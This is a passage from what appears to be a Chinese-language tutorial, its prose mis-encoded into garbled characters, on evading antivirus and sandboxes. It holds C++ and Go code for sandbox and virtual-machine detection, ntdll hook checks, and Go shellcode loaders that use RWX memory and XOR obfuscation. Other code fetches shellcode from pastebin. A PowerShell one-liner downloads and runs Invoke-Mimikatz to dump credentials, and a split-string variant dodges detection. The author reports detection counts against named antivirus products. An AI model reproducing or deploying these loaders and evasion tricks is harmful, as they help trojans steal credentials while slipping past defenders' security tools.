MapViewOfFile(hDllFileMapping, FILE_MAP_READ, 0, 0, 0);CloseHandle(dllFile);&#x2F;&#x2F; analyze the dllPIMAGE_DOS_HEADER pDosHeader &#x3D; (PIMAGE_DOS_HEADER)pDllFileMappingBase;PIMAGE_NT_HEADERS pNtHeader &#x3D; (PIMAGE_NT_HEADERS)((PBYTE)pDllFileMappingBase + pDosHeader-&gt;e_lfanew);PIMAGE_OPTIONAL_HEADER pOptionalHeader &#x3D; (PIMAGE_OPTIONAL_HEADER)&amp;(pNtHeader-&gt;OptionalHeader);PIMAGE_EXPORT_DIRECTORY pExportDirectory &#x3D; (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pDllFileMappingBase + pOptionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);PULONG pAddressOfFunctions &#x3D; (PULONG)((PBYTE)pDllFileMappingBase + pExportDirectory-&gt;AddressOfFunctions);PULONG pAddressOfNames &#x3D; (PULONG)((PBYTE)pDllFileMappingBase + pExportDirectory-&gt;AddressOfNames);PUSHORT pAddressOfNameOrdinals &#x3D; (PUSHORT)((PBYTE)pDllFileMappingBase + pExportDirectory-&gt;AddressOfNameOrdinals);&#x2F;&#x2F; find the original function codePVOID pNtCreateThreadExOriginal &#x3D; NULL;for (int i &#x3D; 0; i &lt; pExportDirectory-&gt;NumberOfNames; ++i)&#123; PCSTR pFunctionName &#x3D; (PSTR)((PBYTE)pDllFileMappingBase + pAddressOfNames[i]); if (!strcmp(pFunctionName, &quot;NtCreateThreadEx&quot;)) &#123; pNtCreateThreadExOriginal &#x3D; (PVOID)((PBYTE)pDllFileMappingBase + pAddressOfFunctions[pAddressOfNameOrdinals[i]]); break; &#125;&#125;&#x2F;&#x2F; compare functionsPVOID pNtCreateThreadEx &#x3D; GetProcAddress(GetModuleHandleW(L&quot;ntdll.dll&quot;), &quot;NtCreateThreadEx&quot;);if (memcmp(pNtCreateThreadEx, pNtCreateThreadExOriginal, 16)) return false; GetTickCountGetTickCount æ˜¯win32 APIä¹‹ä¸€ï¼Œç”¨æ¥è®°å½•ç”µè„‘å¼€æœºåçš„è¿è¡Œæ—¶é—´ï¼ˆä»¥æ¯«ç§’ä¸ºå•ä½ï¼‰æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªå‡½æ•°æ£€æµ‹å½“å‰ç¯å¢ƒçš„è¿è¡Œæ—¶é—´ï¼Œå¦‚æœæ—¶é—´å¾ˆçŸ­é‚£ä¹ˆå°±æœ‰å¯èƒ½æ˜¯æ²™ç®±ã€‚ ä¸ºä»€ä¹ˆæ—¶é—´å¾ˆçŸ­å°±å¯èƒ½æ˜¯æ²™ç®±ç¯å¢ƒå‘¢ï¼Ÿæ²™ç®±å¯¹æ¶æ„ç¨‹åºçš„æ£€æµ‹æµç¨‹å¤§è‡´å¦‚ä¸‹ 1.å¯åŠ¨è™šæ‹Ÿç¯å¢ƒ2.å°†æ¶æ„ç¨‹åºå¤åˆ¶è¿›è™šæ‹Ÿç¯å¢ƒ3.è¿è¡Œæ¶æ„ç¨‹åºä¸€æ®µæ—¶é—´ï¼ˆä¸€èˆ¬ä¸º5åˆ†é’Ÿï¼‰4.è·å–è™šæ‹Ÿç¯å¢ƒè¿”å›çš„æŠ¥å‘Š5.å…³æœº å…¨ç¨‹ä¸è¿‡6.7åˆ†é’Ÿï¼Œè€Œæ­£å¸¸çš„æœºå™¨è¿è¡Œæ—¶é—´è‚¯å®šæ˜¯å¤§äºè¿™ä¸ªå€¼çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å®šä¸€ä¸ªæ ‡å‡†ï¼šå¦‚æœGetTickCountè¿”å›çš„å€¼å°äº10minï¼Œé‚£ä¹ˆå°±è¢«åˆ¤ä¸ºæ²™ç®±ç¯å¢ƒã€‚ CPU,RAMç­‰ä¿¡æ¯æ²™ç®±çš„CPUIå¤šä¸º1æ ¸ï¼Œramå¤šå°äº2gï¼Œç¡¬ç›˜å¤§å°å¤šå°äº100gã€‚æˆ‘ä»¬å¯ä»¥ä»¥æ­¤ä¸ºä¸€ä¸ªåŸºå‡†è¿›è¡Œæ²™ç®±æ£€æµ‹ã€‚ &#x2F;&#x2F;cpu processorsSYSTEM_INFO systeminfo; GetSystemInfo(&amp;systeminfo); DWORD numberOfProcessors &#x3D; systeminfo.dwNumberOfProcessors; &#x2F;&#x2F;ram MEMORYSTATUSEX memoryStatus; memoryStatus.dwLength &#x3D; sizeof(memoryStatus); GlobalMemoryStatusEx(&amp;memoryStatus); DWORD RAMMB &#x3D; memoryStatus.ullTotalPhys &#x2F; 1024 &#x2F; 1024;&#x2F;&#x2F;hdd(ç¡¬ç›˜å¤§å°) HANDLE hDevice &#x3D; CreateFileW(L&quot;\\\\\\\\.\\\\PhysicalDrive0&quot;, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL); DISK_GEOMETRY pDiskGeometry; DWORD bytesReturned; DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &amp;pDiskGeometry, sizeof(pDiskGeometry), &amp;bytesReturned, (LPOVERLAPPED)NULL); DWORD diskSizeGB; diskSizeGB &#x3D; pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector &#x2F; 1024 &#x2F; 1024 &#x2F; 1024; printf(&quot;cpu:%d,ram:%d,size(gb):%d&quot;, numberOfProcessors, RAMMB, diskSizeGB); macå¸¸è§è™šæ‹Ÿæœºå¦‚vmwareï¼Œviturl boxç­‰éƒ½æœ‰ç‰¹æ®Šçš„macåœ°å€ï¼Œå¯ä»¥ä»¥æ­¤ä¸ºä¾æ®åˆ¤æ–­æ˜¯å¦åœ¨è™šæ‹Ÿæœºä¸­ï¼ˆéšç€è™šæ‹ŸåŒ–ä¸»æœºè¶Šæ¥è¶Šæ™®éï¼Œè®¸å¤šå…¬å¸å°†ä¸šåŠ¡ç³»ç»Ÿä¹Ÿæ¬è¿›äº†è™šæ‹Ÿæœºï¼Œè¿™ä¸ªæ–¹æ³•å·²ä¸å¤ªèƒ½ä½œä¸ºæ£€æµ‹æ²™ç®±çš„æŒ‡æ ‡ï¼‰ â€œé€šå¸¸ï¼ŒMACåœ°å€çš„å‰ä¸‰ä¸ªå­—èŠ‚æ ‡è¯†ä¸€ä¸ªæä¾›å•†ã€‚ä»¥00:05:69ã€00:0c:29å’Œ00:50:56å¼€å§‹çš„MACåœ°å€ä¸VMwareç›¸å¯¹åº”ï¼›ä»¥00:03:ffå¼€å§‹çš„MACåœ°å€ä¸virtualpcå¯¹åº”ï¼›ä»¥08:00:27å¼€å§‹çš„MACåœ°å€ä¸virtualboxå¯¹åº”ã€‚â€ string mac; get_3part_mac(mac); if (mac &#x3D;&#x3D; &quot;00-05-69&quot; || mac &#x3D;&#x3D; &quot;00-0c-29&quot; || mac &#x3D;&#x3D; &quot;00-50-56&quot; || mac &#x3D;&#x3D; &quot;00-03-ff&quot; || mac &#x3D;&#x3D; &quot;08-00-27&quot;) &#123; &#125; else &#123; &#125; void get_3part_mac(string &amp;mac) &#123; NCB Ncb; ASTAT Adapter; UCHAR uRetCode; LANA_ENUM lenum; memset(&amp;Ncb, 0, sizeof(Ncb)); Ncb.ncb_command &#x3D; NCBENUM; Ncb.ncb_buffer &#x3D; (UCHAR *)&amp;lenum; Ncb.ncb_length &#x3D; sizeof(lenum); uRetCode &#x3D; Netbios(&amp;Ncb); for (int i &#x3D; 0; i &lt; lenum.length; i++) &#123; memset(&amp;Ncb, 0, sizeof(Ncb)); Ncb.ncb_command &#x3D; NCBRESET; Ncb.ncb_lana_num &#x3D; lenum.lana[i]; uRetCode &#x3D; Netbios(&amp;Ncb); memset(&amp;Ncb, 0, sizeof(Ncb)); Ncb.ncb_command &#x3D; NCBASTAT; Ncb.ncb_lana_num &#x3D; lenum.lana[i]; strcpy((char *)Ncb.ncb_callname, &quot;*&quot;); Ncb.ncb_buffer &#x3D; (unsigned char *)&amp;Adapter; Ncb.ncb_length &#x3D; sizeof(Adapter); uRetCode &#x3D; Netbios(&amp;Ncb); if (uRetCode &#x3D;&#x3D; 0) &#123; char tmp[128]; sprintf(tmp, &quot;%02x-%02x-%02x&quot;, Adapter.adapt.adapter_address[0], Adapter.adapt.adapter_address[1], Adapter.adapt.adapter_address[2] ); mac &#x3D; tmp; &#125; &#125; &#125; åˆ†è¾¨ç‡æ²™ç®±çš„åˆ†è¾¨ç‡éƒ½ä¸å¤ªæ­£å¸¸ æ£€æŸ¥æ—¶åŒºä¸æ—¶é—´æµåŠ¨æ€§æ²™ç®±å¾€å¾€ä¼šåŠ é€Ÿè¿è¡Œæ–‡ä»¶ï¼Œæ•…å¯ä»¥æ£€æŸ¥æ—¶é—´æµåŠ¨æ€§æ˜¯å¦æ­£å¸¸ä»è€Œæ£€æµ‹æ²™ç®± &#x2F;&#x2F;æ—¶åŒº DYNAMIC_TIME_ZONE_INFORMATION DynamicTimeZoneInfo; GetDynamicTimeZoneInformation(&amp;DynamicTimeZoneInfo); wchar_t wcTimeZoneName[128 + 1]; StringCchCopyW(wcTimeZoneName, 128, DynamicTimeZoneInfo.TimeZoneKeyName); CharUpperW(wcTimeZoneName); if (!wcsstr(wcTimeZoneName, L&quot;CHINA STANDARD TIME&quot;)) &#123; &#125; &#x2F;&#x2F;æµåŠ¨æ€§ clock_t ClockStartTime, ClockEndTime; time_t UnixStartTime &#x3D; time(0); ClockStartTime &#x3D; clock(); Sleep(10000); ClockEndTime &#x3D; clock(); time_t UnixEndTime &#x3D; time(0); int iTimeDifference &#x3D; ((UnixEndTime - UnixStartTime) * 1000) - (ClockEndTime - ClockStartTime); if (iTimeDifference&gt;150)&#123;&#x2F;&#x2F;*code &#125; æ£€æµ‹æ–‡ä»¶åæ˜¯å¦è¢«æ²™ç®±æ›´æ”¹wchar_t currentProcessPath[MAX_PATH + 1];GetModuleFileNameW(NULL, currentProcessPath, MAX_PATH + 1);CharUpperW(currentProcessPath);if (!wcsstr(currentProcessPath, L&quot;evil.EXE&quot;)) return false; Time-Based EvasionåŸºäºæ—¶é—´çš„è§„é¿ã€‚å³æ¶æ„è½¯ä»¶åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šè¿è¡Œåå¹¶ä¸ä¼šç«‹åˆ»è¿›è¡Œæ¶æ„è¡ŒåŠ¨ï¼Œè€Œæ˜¯ä¼šä¼ªè£…ã€ä¼‘çœ ä¸€æ®µæ—¶é—´ï¼Œç­‰åˆ°ä¸€å®šæ—¶é—´åå†å¼€å§‹æ¶æ„è¡ŒåŠ¨ ä½¿ç”¨ç½‘ç»œè¿æ¥å®æ—¶è¯»å–å¯åŠ¨æŒ‡ä»¤æ„æ€å°±æ˜¯è¯´è¯¥ç¨‹åºä¼šä¸æ–­å‘æŸä¸ªç½‘å€å‘é€è¯·æ±‚åŒ…ï¼Œå¦‚æœç½‘å€è¿”å›äº†å¯¹åº”çš„å¯åŠ¨æŒ‡ä»¤åˆ™å¼€å§‹è°ƒç”¨æ¶æ„ä»£ç ã€‚ ä¸‹å›¾æ˜¯ç”¨HTTPè¯·æ±‚è·å–ç½‘é¡µå†…å®¹çš„ä»£ç ã€‚ HINTERNET hSession &#x3D; WinHttpOpen(L&quot;Mozilla 5.0&quot;, WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);HINTERNET hConnection &#x3D; WinHttpConnect(hSession, L&quot;www.baidu.com&quot;, INTERNET_DEFAULT_HTTP_PORT, 0);HINTERNET hRequest &#x3D; WinHttpOpenRequest(hConnection, L&quot;GET&quot;, L&quot;&quot;, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, NULL);WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);WinHttpReceiveResponse(hRequest, 0);DWORD responseLength;WinHttpQueryDataAvailable(hRequest, &amp;responseLength);PVOID response &#x3D; new char[responseLength + 1];WinHttpReadData(hRequest, response, responseLength, &amp;responseLength);std::cout &lt;&lt; ((char *)response); User Activity Based Checksé€šè¿‡æ£€æµ‹ä¸€äº›è¡Œä¸ºï¼Œæ¥è¯†åˆ«å½“å‰å®æ–½è€…æ˜¯å¦ä¸ºäººç±»ã€‚ï¼ˆæ¯”å¦‚åŠ¨é¼ æ ‡ï¼Œæ•²é”®ç›˜ç­‰ï¼Œæˆ–è€…æŸ¥è¯¢ç”µè„‘ä¸Šwordæ–‡æ¡£æ‰“å¼€å†å²æ•°ï¼Œchromeå†å²è®°å½•ç­‰ä¿¡æ¯æ¥åˆ¤æ–­ï¼‰ é¼ æ ‡ç§»åŠ¨è½¨è¿¹å¯ä»¥è®¾ç½®é¼ æ ‡ç§»åŠ¨å¤šå°‘è·ç¦»æ‰æ‰§è¡Œshellcodeï¼Œæ²™ç®±æœ‰äº›æ˜¯æ²¡æœ‰é¼ æ ‡çš„ã€‚ POINT CurrentMousePos; POINT PreviousMousePos; GetCursorPos(&amp;PreviousMousePos); double Dis &#x3D; 0; while (true) &#123; GetCursorPos(&amp;CurrentMousePos); Dis+&#x3D; sqrt(pow(CurrentMousePos.x - PreviousMousePos.x, 2) + pow(CurrentMousePos.y - PreviousMousePos.y, 2)); Sleep(100); if (Dis &gt; 20000) &#123;&#x2F;&#x2F;*code &#125; &#125; æ£€æµ‹çˆ¶è¿›ç¨‹å¯¹äºä¸€ä¸ªæ­£å¸¸çš„ç”¨æˆ·æ¥è¯´ï¼Œå¯åŠ¨exeæ–‡ä»¶åº”è¯¥æ˜¯åŒå‡»è¿è¡Œï¼Œç¨‹åºå¯åŠ¨åçˆ¶è¿›ç¨‹æ˜¯explore.exeï¼Œå¦‚æœæ˜¯cmdè¿è¡Œåˆ™ä¼šæ˜¯cmd.exeã€ä½†æ˜¯å¯¹äºæ²™ç®±å°±æœ‰å¯èƒ½å­˜åœ¨ç”¨ä¸€ä¸ªç¨‹åºå¦‚windbgæ¥å¯åŠ¨æˆ‘ä»¬çš„æ¶æ„EXEæ–‡ä»¶ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±éœ€è¦å¯¹æ­¤ç‚¹è¿›è¡Œæ£€æµ‹ã€‚ DWORD GetParentPID(DWORD pid)&#123; DWORD ppid &#x3D; 0; PROCESSENTRY32W processEntry &#x3D; &#123; 0 &#125;; processEntry.dwSize &#x3D; sizeof(PROCESSENTRY32W); HANDLE hSnapshot &#x3D; CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); &#x2F;&#x2F;å¯¹æ‰€æœ‰è¿›ç¨‹åˆ›å»ºå¿«ç…§ if (Process32FirstW(hSnapshot, &amp;processEntry)) &#x2F;&#x2F;éå†å¿«ç…§ï¼Œæ‰¾åˆ°å½“å‰ä¼ å…¥PIDçš„è¿›ç¨‹ä¿¡æ¯ &#123; do &#123; if (processEntry.th32ProcessID &#x3D;&#x3D; pid) &#123; ppid &#x3D; processEntry.th32ParentProcessID; &#x2F;&#x2F;æ‰¾åˆ°å¹¶è¿”å›ä¼ å…¥PIDçš„çˆ¶è¿›ç¨‹PID break; &#125; &#125; while (Process32NextW(hSnapshot, &amp;processEntry)); &#125; CloseHandle(hSnapshot); return ppid;&#125;void main()&#123; DWORD parentPid &#x3D; GetParentPID(GetCurrentProcessId()); &#x2F;&#x2F;è·å–å½“å‰è¿›ç¨‹çˆ¶è¿›ç¨‹PID WCHAR parentName[MAX_PATH + 1]; DWORD dwParentName &#x3D; MAX_PATH; HANDLE hParent &#x3D; OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, parentPid); &#x2F;&#x2F;æ‰“å¼€çˆ¶è¿›ç¨‹ QueryFullProcessImageNameW(hParent, 0, parentName, &amp;dwParentName); &#x2F;&#x2F; another way to get process name is to use &#39;Toolhelp32Snapshot&#39; &#x2F;&#x2F;è·å–è¿›ç¨‹å CharUpperW(parentName); if (wcsstr(parentName, L&quot;WINDBG.EXE&quot;)) return; &#x2F;&#x2F;åŒ¹é… wprintf_s(L&quot;Now hacking...\\n&quot;);&#125; è¿›ç¨‹é•‚ç©ºåŠ¨æ€è°ƒç”¨APIvoid* ntAllocateVirtualMemory &#x3D; GetProcAddress(LoadLibraryA(&quot;ntdll.dll&quot;), &quot;NtAllocateVirtualMemory&quot;); Powershellè¿œç¨‹æ‰§è¡Œä¸æœ¬åœ°æ‰§è¡Œè¿œç¨‹æ‰§è¡Œpowershellå¯ä»¥åŠ è½½è¿œç¨‹çš„ps1æ–‡ä»¶ã€‚è¿™æ ·åšçš„å¥½å¤„æ˜¯å®ç°äº†æ— æ–‡ä»¶è½åœ°ã€‚ powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz -DumpCreds&quot; ä¸è¿‡å¸‚é¢ä¸Šå¾ˆå¤šæ€è½¯å¯¹downloadstringæ£€æµ‹ååˆ†ååˆ†ä¸¥æ ¼(è®¸å¤šä¼šæ£€æµ‹è¿œç¨‹æ–‡ä»¶å®‰å…¨æ€§ï¼‰ powershell -exec bypass -f \\\\webdavserver\\folder\\payload.ps1 (smb) æœ¬åœ°æ‰§è¡Œpowershell Import-Module .\\xx.ps1 å‘½ä»¤æ‹†åˆ†å°±åƒåˆšåˆšè¿œç¨‹åŠ è½½çš„downloadstringæ³•ï¼Œå®ƒå¾ˆå®¹æ˜“è¢«æ€è½¯æ‹¦æˆªã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡æ‹†åˆ†é‡ç»„ç»•è¿‡ä¸€äº›æ€è½¯æ£€æµ‹ã€‚ powershell -c &quot;$c1&#x3D;&#39;IEX(New-Object Net.WebClient).Downlo&#39;;$c2&#x3D;&#39;123(&#39;&#39;http:&#x2F;&#x2F;webserver&#x2F;xxx.ps1&#39;&#39;)&#39;.Replace(&#39;123&#39;,&#39;adString&#39;);IEX ($c1+$c2)&quot; GOFUNNYå¾ˆæœ‰è¶£çš„ä¸€ä»¶äº‹æ˜¯ï¼Œç”¨goè¯­è¨€å†™ä¸ªhelloworldä¼ åˆ°vtè¢«14å®¶æ€,ç‰›æ‰¹ ç”ŸæˆEXEgo ç¼–è¯‘ä¸ºEXE çš„åšæ³•æ˜¯go build â€¦.goï¼Œä½†è¿™æ ·EXEæ‰“å¼€æ—¶ä¼šæœ‰ä¸ªé»‘æ¡† go build -ldflags â€œ-H windowsguiâ€ ..go ç”Ÿæˆæ— çª—å£EXEï¼Œä½†è¿™æ ·ä¼šå¢åŠ æ€è½¯çš„æŸ¥æ€åº¦ ç”³è¯·å†…å­˜åŠ è½½shellcodepackage mainimport (&quot;syscall&quot;&quot;unsafe&quot;)const ( MEM_COMMIT &#x3D; 0x1000 MEM_RESERVE &#x3D; 0x2000 PAGE_EXECUTE_READWRITE &#x3D; 0x40 &#x2F;&#x2F; åŒºåŸŸå¯ä»¥æ‰§è¡Œä»£ç ï¼Œåº”ç”¨ç¨‹åºå¯ä»¥è¯»å†™è¯¥åŒºåŸŸã€‚ KEY_1 &#x3D; 55 KEY_2 &#x3D; 66)var ( kernel32 &#x3D; syscall.MustLoadDLL(&quot;kernel32.dll&quot;) ntdll &#x3D; syscall.MustLoadDLL(&quot;ntdll.dll&quot;) VirtualAlloc &#x3D; kernel32.MustFindProc(&quot;VirtualAlloc&quot;) RtlCopyMemory &#x3D; ntdll.MustFindProc(&quot;RtlCopyMemory&quot;))func main()&#123; shellcode:&#x3D;[]byte&#123;0xfc,...,0x30,0x00,0x19,0x69,0xa0,0x8d&#125; addr,_,err:&#x3D;VirtualAlloc.Call(0,uintptr(len(shellcode)),MEM_COMMIT, PAGE_EXECUTE_READWRITE ) if err !&#x3D; nil &amp;&amp; err.Error() !&#x3D; &quot;The operation completed successfully.&quot; &#123; syscall.Exit(0) &#125; _, _, err &#x3D; RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&amp;shellcode[0])), uintptr(len(shellcode))) if err !&#x3D; nil &amp;&amp; err.Error() !&#x3D; &quot;The operation completed successfully.&quot; &#123; syscall.Exit(0) &#125; syscall.Syscall(addr, 0, 0, 0, 0)&#125; æœ€åŸå§‹ç‰ˆæœ¬,è¢«æ€æˆå“ˆæ‰¹ï¼Œä½†å³ä½¿è¿™æ ·360ä¹Ÿæ€ä¸å‡ºæ¥ï¼Œå¯ä»¥çœ‹å‡ºç»•è¿‡360æœ‰æ‰‹å°±è¡Œ ç®€å•XORxoræ¨¡å—ï¼ˆè·å¾—xoråçš„shellcodeï¼‰ for i:&#x3D;0;i&lt;len(shellcode);i++&#123; fmt.Print(&quot;0x&quot;,strconv.FormatInt(int64(shellcode[i]^123),16),&quot;,&quot;) &#125; xor_shellcode:&#x3D;[]byte&#123;xored_shellcode&#125;var shellcode []bytefor i:&#x3D;0;i&lt;len(xor_shellcode);i++&#123; shellcode&#x3D;append(shellcode,xor_shellcode[i]^123)&#125;addr,_,err:&#x3D;VirtualAlloc.Call(0,uintptr(len(shellcode)),MEM_COMMIT, PAGE_EXECUTE_READWRITE )if err !&#x3D; nil &amp;&amp; err.Error() !&#x3D; &quot;The operation completed successfully.&quot; &#123; syscall.Exit(0)&#125;_, _, err &#x3D; RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&amp;shellcode[0])), uintptr(len(shellcode)))if err !&#x3D; nil &amp;&amp; err.Error() !&#x3D; &quot;The operation completed successfully.&quot; &#123; syscall.Exit(0)&#125;syscall.Syscall(addr, 0, 0, 0, 0) å¥½äº†ç‚¹ï¼Œä½†æ˜¯å¦‚æœåŠ ä¸Šæ— æ¡†å¯åŠ¨ï¼Œè¿˜æ˜¯ä¼šè¢«æ€æˆå“ˆæ‰¹ æ²™ç›’&amp;è™šæ‹Ÿæœºæ£€æµ‹imoprt&#123; &quot;github.com&#x2F;shirou&#x2F;gopsutil&#x2F;host&quot; &quot;github.com&#x2F;shirou&#x2F;gopsutil&#x2F;mem&quot; &quot;github.com&#x2F;shirou&#x2F;gopsutil&#x2F;disk&quot; &#125;func CheckTime() bool&#123; timeBoot, _ :&#x3D; host.BootTime() t :&#x3D; time.Unix(int64(timeBoot), 0) timeNow:&#x3D;time.Now() ts:&#x3D;timeNow.Sub(t) if ts.Minutes()&lt;12&#123; return false &#125;else&#123; return true &#125;&#125;func CheckName() bool&#123; files, _ :&#x3D; ioutil.ReadDir(&quot;.&#x2F;&quot;) for _, f :&#x3D; range files &#123; if f.Name()&#x3D;&#x3D;&quot;ActiveX.exe&quot;&#123; return true &#125; &#125; return false&#125;func CheckSystem() bool&#123; info1,_:&#x3D;mem.SwapMemory() info2,_:&#x3D;mem.VirtualMemory() disk,_:&#x3D;disk.Usage(&quot;c:&quot;) if(runtime.NumCPU()&lt;2&amp;&amp;info1.Total&lt;2147483648&amp;&amp;info2.Total&lt;2147483648&amp;&amp;disk.Total&lt;21474836480)&#123; return false &#125; return true&#125; ç”¨å®ƒå’ŒXORæ‰“ç»„åˆæ‹³æ•ˆæœå°†å°±ï¼Œç”¨äº†æ— çª—å¯åŠ¨åæœ‰7ä¸ªæŸ¥å‡ºæ¥ è™šæ‹Ÿæœºï¼šæ•æ„Ÿæ–‡ä»¶æ£€æµ‹è¿™ä¸ªä¼šè¢«defenderæ‹¦ï¼Œä¸å¿…è¦çš„è¯ä¸ç”¨è¿™ä¸ª func PathExists(path string) (bool, error) &#123; &#x2F;&#x2F;åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨ _, err :&#x3D; os.Stat(path) if err &#x3D;&#x3D; nil &#123; return true, nil &#125; if os.IsNotExist(err) &#123; return false, nil &#125; return false, err&#125;func fack(path string) &#123; &#x2F;&#x2F;åˆ¤æ–­è™šæ‹Ÿæœºå…³é”®æ–‡ä»¶æ˜¯å¦å­˜åœ¨ b, _ :&#x3D; PathExists(path) if b &#123; fmt.Printf(&quot;å½“å‰æ˜¯è™šæ‹Ÿæœºç¯å¢ƒï¼Œåˆ«åˆ†æäº†ï¼Œå“¥ã€‚&quot;) os.Exit(1) &#x2F;&#x2F;å¦‚æœæ˜¯è™šæ‹Ÿæœºå°±é€€å‡ºå½“å‰è¿›ç¨‹ &#125;&#125;func check() &#123; fack(&quot;C:\\\\windows\\\\System32\\\\Drivers\\\\Vmmouse.sys&quot;) fack(&quot;C:\\\\windows\\\\System32\\\\Drivers\\\\vmtray.dll&quot;) fack(&quot;C:\\\\windows\\\\System32\\\\Drivers\\\\VMToolsHook.dll&quot;) fack(&quot;C:\\\\windows\\\\System32\\\\Drivers\\\\vmmousever.dll&quot;) fack(&quot;C:\\\\windows\\\\System32\\\\Drivers\\\\vmhgfs.dll&quot;) fack(&quot;C:\\\\windows\\\\System32\\\\Drivers\\\\vmGuestLib.dll&quot;) fack(&quot;C:\\\\windows\\\\System32\\\\Drivers\\\\VBoxMouse.sys&quot;) fack(&quot;C:\\\\windows\\\\System32\\\\Drivers\\\\VBoxGuest.sys&quot;) fack(&quot;C:\\\\windows\\\\System32\\\\Drivers\\\\VBoxSF.sys&quot;) fack(&quot;C:\\\\windows\\\\System32\\\\Drivers\\\\VBoxVideo.sys&quot;) fack(&quot;C:\\\\windows\\\\System32\\\\vboxdisp.dll&quot;) fack(&quot;C:\\\\windows\\\\System32\\\\vboxhook.dll&quot;) fack(&quot;C:\\\\windows\\\\System32\\\\vboxoglerrorspu.dll&quot;) fack(&quot;C:\\\\windows\\\\System32\\\\vboxoglpassthroughspu.dll&quot;) fack(&quot;C:\\\\windows\\\\System32\\\\vboxservice.exe&quot;) fack(&quot;C:\\\\windows\\\\System32\\\\vboxtray.exe&quot;) fack(&quot;C:\\\\windows\\\\System32\\\\VBoxControl.exe&quot;)&#125; è¿œç¨‹è¯»shellcodeUrl,err:&#x3D;url.Parse(&quot;https:&#x2F;&#x2F;pastebin.com&#x2F;aa&quot;)if err!&#x3D;nil&#123; panic(&quot;error&quot;)&#125;client:&#x3D;http.Client&#123;&#125;req,_:&#x3D;http.NewRequest(&quot;GET&quot;,Url.String(),nil)req.Header.Add(&quot;User-Agent&quot;,&quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;90.0.4430.93 Safari&#x2F;537.36&quot;)req.Header.Add(&quot;Cookie&quot;,&quot;SUB&#x3D;_2 SUBP&#x3D;00&quot;)resp,_:&#x3D;client.Do(req)body,_:&#x3D;ioutil.ReadAll(resp.Body) &#x2F;&#x2F;stringå½¢å¼è·å–äº†é¡µé¢å†…å®¹,ä»¥ä¸Šä»£ç ä¸ºä¸»ä½“éƒ¨åˆ†&#x2F;&#x2F;é€šè¿‡ä¸€ç³»åˆ—æ­£åˆ™åŒ¹é…,å­—ç¬¦ä¸²æˆªå–ç­‰æ–¹æ³•ä»é¡µé¢ä¸­å¾—åˆ°shellcode(é¡µé¢ä¸­æˆ‘çš„shellcodeæ˜¯è¿™æ ·çš„rngrngfc,48,....,aalgdlgd)re:&#x3D;regexp.MustCompile(&#96;rngrng.*lgdlgd&#96;)match:&#x3D;re.FindString(string(body))match&#x3D;match[6:len(match)-6]return match ä½†æ˜¯æ‹–ä¸‹æ¥çš„shellcodeæ˜¯stringæ ¼å¼ï¼Œæˆ‘ä»¬éœ€è¦æŠŠä»–è½¬ä¸º[]byte func aa(encodes string) []byte&#123; var xor_shellcode []byte spi:&#x3D;&quot;,&quot; enc:&#x3D;strings.Split(encodes,spi) for i,_ :&#x3D;range enc&#123; tmps,_:&#x3D;hex.DecodeString(enc[i]) if(len(tmps)&gt;0) &#123; xor_shellcode &#x3D; append(xor_shellcode, tmps[0]) &#125; &#125; return xor_shellcode&#125; è¿œç¨‹+XOR+æ²™ç®± åè€Œè¢«æ€çš„æ›´å¤šâ€¦çœ‹æ¥è¿™ä¸ªHTTPå‡½æ•°è¢«æŠ“çš„å¾ˆç´§ï¼Œè¿˜è¢«360æ€å‡ºæ¥äº† è¯»å–æ–‡ä»¶ä¸­çš„SHELLCODEvar sc []bytebytes,_:&#x3D;ioutil.ReadFile(&quot;C:\\\\Users\\\\xx\\\\Desktop\\\\sc.txt&quot;)tmp:&#x3D;strings.Split(string(bytes),&quot;,&quot;)for i,_ :&#x3D;range tmp&#123; tmps,_:&#x3D;hex.DecodeString(tmp[i]) if(len(tmps)&gt;0) &#123; sc &#x3D; append(sc, tmps[0]) &#125;&#125; å¯ä»¥ æ–‡ä»¶é‡Šæ”¾åœ¨æˆ‘ä»¬æœ¨é©¬è¿è¡Œæ—¶å¯ä»¥é‡Šæ”¾ä¸€ä¸ªæ­£å¸¸æ–‡ä»¶å¹¶è¿è¡Œï¼Œè¾¾åˆ°DLLåŠ«æŒæˆ–è€…è¿·æƒ‘è§†å¬çš„ä½œç”¨ã€‚ è·å–æ–‡ä»¶å†…å®¹ file,_:&#x3D;os.Open(&quot;E:\\\\tools\\\\shell\\\\cobaltstrike4.3\\\\cobaltstrike.exe&quot;) fi,_:&#x3D;file.Stat() size:&#x3D;fi.Size() data :&#x3D; make([]byte, size) file.Read(data) for _,i:&#x3D;range data&#123; fmt.Print(strconv.Itoa(int(i))+&quot;,&quot;) 